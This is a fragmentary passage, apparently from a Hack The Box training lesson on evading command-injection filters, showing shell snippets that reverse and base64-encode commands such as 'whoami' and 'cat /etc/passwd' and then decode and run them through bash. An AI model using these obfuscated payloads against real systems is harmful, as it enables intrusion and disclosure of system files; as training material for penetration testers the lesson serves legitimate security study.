...
![Filter Commands](imgs/cmdinj_filters_commands_3.jpg)
...
![Filter Commands](imgs/cmdinj_filters_commands_4.jpg)
...
```shell-session
swmpdnky@htb[/htb]$ echo 'whoami' | rev
imaohw
```
...
![Filter Commands](imgs/cmdinj_filters_commands_5.jpg)
...
```shell-session
swmpdnky@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
...
```shell-session
swmpdnky@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
...
![Filter Commands](imgs/cmdinj_filters_commands_6.jpg)
...
```shell-session
swmpdnky@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
